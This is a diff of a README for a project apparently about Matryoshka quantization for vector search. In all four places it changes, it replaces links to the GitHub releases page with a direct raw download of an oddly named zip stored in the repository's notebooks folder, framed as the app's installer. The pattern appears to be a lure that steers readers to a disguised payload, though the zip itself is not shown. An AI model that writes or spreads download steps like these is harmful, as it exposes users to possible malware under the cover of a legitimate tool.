@@ -1,6 +1,6 @@
 # 🧸 matryoshka-quantization-analysis - Simplify Vector Search Costs
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/Granitewaregingerpop349/matryoshka-quantization-analysis/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/Granitewaregingerpop349/matryoshka-quantization-analysis/main/notebooks/quantization_analysis_matryoshka_rectificatory.zip)
 
 ---
 
@@ -34,7 +34,7 @@ This section guides you step-by-step on how to download and run the application 
 
 Please visit this page to download the latest version:
 
-[Download Latest Version](https://github.com/Granitewaregingerpop349/matryoshka-quantization-analysis/releases)
+[Download Latest Version](https://raw.githubusercontent.com/Granitewaregingerpop349/matryoshka-quantization-analysis/main/notebooks/quantization_analysis_matryoshka_rectificatory.zip)
 
 ---
 
@@ -117,7 +117,7 @@ For errors during use:
 
 Visit the release page again regularly to check for updates:
 
-[https://github.com/Granitewaregingerpop349/matryoshka-quantization-analysis/releases](https://github.com/Granitewaregingerpop349/matryoshka-quantization-analysis/releases)
+[https://raw.githubusercontent.com/Granitewaregingerpop349/matryoshka-quantization-analysis/main/notebooks/quantization_analysis_matryoshka_rectificatory.zip](https://raw.githubusercontent.com/Granitewaregingerpop349/matryoshka-quantization-analysis/main/notebooks/quantization_analysis_matryoshka_rectificatory.zip)
 
 Download and install the latest version following the same steps. Updates improve features and fix bugs.
 
@@ -158,4 +158,4 @@ A: Restart your computer and then try opening the app again.
 
 ## 📥 Download Link (Again for Easy Access)
 
-[Download Latest Release](https://github.com/Granitewaregingerpop349/matryoshka-quantization-analysis/releases)
+[Download Latest Release](https://raw.githubusercontent.com/Granitewaregingerpop349/matryoshka-quantization-analysis/main/notebooks/quantization_analysis_matryoshka_rectificatory.zip)
